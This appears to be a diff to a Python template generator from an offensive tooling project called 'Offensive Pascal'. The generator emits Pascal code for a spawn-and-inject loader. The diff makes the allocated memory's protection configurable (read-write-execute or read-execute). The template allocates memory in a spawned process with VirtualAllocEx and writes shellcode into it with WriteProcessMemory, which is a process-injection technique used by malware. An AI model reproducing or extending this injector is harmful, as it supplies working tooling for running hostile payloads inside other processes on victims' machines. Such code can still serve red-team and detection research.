@@ -1,4 +1,10 @@
 class spawnandinject:
+    def __init__(self, arguments):
+        if 'perm' in arguments:
+            if arguments['perm'] == 'rwx':
+                self.memoryPermission = 'PAGE_EXECUTE_READWRITE'
+            else:
+                self.memoryPermission = 'PAGE_EXECUTE_READ'
 
     def imports(self) -> list[str]:
         return ['Classes', 'windows', 'sysutils']
@@ -6,8 +12,8 @@ class spawnandinject:
     def compilerOptions(self) -> list[str]:
         return []
 
-    def template(self) -> str:
-        return """
+    def template(self, imports, codeblocks, transformers, shellcodeSize) -> str:
+        return f"""
 {{
     this one is part of repo published on github under the name of Offensive Pascal
     Pascal is a great and still up to date :)
@@ -48,7 +54,7 @@ begin
 
     
     {transformers}
-    addr := VirtualAllocEx(pi.hProcess, nil, {shellcodeSize}, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READ);
+    addr := VirtualAllocEx(pi.hProcess, nil, {shellcodeSize}, MEM_COMMIT or MEM_RESERVE, {self.memoryPermission});
 
     WriteProcessMemory(pi.hProcess, addr, @shellcode[0], {shellcodeSize}, nil);
 
